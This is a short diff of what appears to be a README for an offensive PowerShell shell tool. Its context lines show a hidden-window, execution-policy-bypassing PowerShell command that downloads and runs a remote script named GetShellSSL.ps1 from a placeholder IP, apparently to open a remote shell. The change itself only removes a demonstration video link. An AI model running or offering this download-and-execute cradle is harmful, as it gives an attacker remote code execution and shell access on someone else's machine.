@@ -37,6 +37,3 @@ OR
 PS > powershell.exe -windowstyle hidden -ExecutionPolicy Unrestricted -nop -Command "IEX (New-Object Net.WebClient).DownloadString('https://<IP>/GetShellSSL.ps1')"
 
 ```
-
-#### Demonstration
-https://user-images.githubusercontent.com/74554439/197293572-e702d0aa-7390-41e5-ac0e-35b2e13a93d8.mp4
